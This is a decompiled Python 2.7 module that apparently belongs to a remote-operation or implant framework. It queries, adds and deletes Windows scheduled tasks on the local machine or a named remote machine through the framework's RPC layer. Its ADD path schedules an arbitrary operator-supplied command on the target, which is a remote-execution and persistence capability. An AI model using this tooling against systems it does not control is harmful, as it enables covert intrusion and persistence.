# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Scheduler_Tasking.py
CMD_TYPE_QUERY = 0
CMD_TYPE_ADD = 1
CMD_TYPE_DELETE = 2

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.status.cmd.scheduler', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.status.cmd.scheduler.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    if lpParams['machinename'] != None:
        target = lpParams['machinename']
    else:
        target = ''
    if lpParams['cmd'] != None:
        command = lpParams['cmd']
    else:
        command = ''
    taskXml = mcl.tasking.Tasking()
    if len(target) > 0:
        taskXml.SetTargetRemote(target)
    else:
        taskXml.SetTargetLocal()
    if lpParams['schedulerType'] == mca.status.cmd.scheduler.PARAMS_SCHEDULER_TYPE_DEFAULT:
        taskXml.AddSearchParam('DEFAULT')
    elif lpParams['schedulerType'] == mca.status.cmd.scheduler.PARAMS_SCHEDULER_TYPE_WINDOWS_AT:
        taskXml.AddSearchParam('AT')
    elif lpParams['schedulerType'] == mca.status.cmd.scheduler.PARAMS_SCHEDULER_TYPE_WINDOWS_GUI:
        taskXml.AddSearchParam('GUI')
    elif lpParams['schedulerType'] == mca.status.cmd.scheduler.PARAMS_SCHEDULER_TYPE_WINDOWS_SERVICE:
        taskXml.AddSearchParam('SERVICE')
    else:
        taskXml.AddSearchParam('UNKNOWN')
    msg = MarshalMessage()
    if lpParams['cmdType'] == CMD_TYPE_QUERY:
        taskXml.SetType('QUERY')
        tgtParams = mca.status.cmd.scheduler.ParamsQuery()
        tgtParams.schedulerType = lpParams['schedulerType']
        if lpParams['folder'] != None:
            tgtParams.folder = lpParams['folder']
        tgtParams.target = target
        rpc = mca.status.cmd.scheduler.tasking.RPC_INFO_QUERY
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
    elif lpParams['cmdType'] == CMD_TYPE_ADD:
        taskXml.SetType('ADD')
        if lpParams['delay'].GetTimeType() == lpParams['delay'].MCL_TIME_TYPE_INVALID:
            mcl.tasking.OutputError('Error in time entry')
            return False
        tgtParams = mca.status.cmd.scheduler.ParamsAdd()
        tgtParams.schedulerType = lpParams['schedulerType']
        tgtParams.interval = lpParams['delay']
        tgtParams.target = target
        tgtParams.cmd = command
        if lpParams['folder'] != None:
            tgtParams.folder = lpParams['folder']
        rpc = mca.status.cmd.scheduler.tasking.RPC_INFO_ADD
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
    elif lpParams['cmdType'] == CMD_TYPE_DELETE:
        taskXml.SetType('DELETE')
        if lpParams['job'] == None or len(lpParams['job']) == 0:
            mcl.tasking.OutputError('A job must be specified for deletion')
            return False
        tgtParams = mca.status.cmd.scheduler.ParamsDelete()
        tgtParams.schedulerType = lpParams['schedulerType']
        tgtParams.job = lpParams['job']
        tgtParams.target = target
        rpc = mca.status.cmd.scheduler.tasking.RPC_INFO_DELETE
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
    else:
        mcl.tasking.OutputError('Invalid command type')
        return False
    rpc.SetMessagingType('message')
    mcl.tasking.OutputXml(taskXml.GetXmlObject())
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.status.cmd.scheduler.errorStrings)
        return False
    else:
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)